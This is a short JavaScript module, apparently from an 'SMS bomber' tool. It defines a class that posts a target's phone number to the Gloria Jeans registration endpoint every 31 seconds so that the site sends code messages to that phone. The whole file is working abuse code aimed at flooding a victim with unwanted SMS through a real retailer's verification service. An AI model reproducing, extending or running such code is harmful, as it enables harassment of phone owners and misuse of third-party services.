const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class GloriaJeansBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = { phoneNumber: this.phone };
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "gloria jeans";
    delay = 31000;
    url = "https://www.gloria-jeans.ru/phone-verification/send-code/registration";  
}
module.exports = GloriaJeansBomber;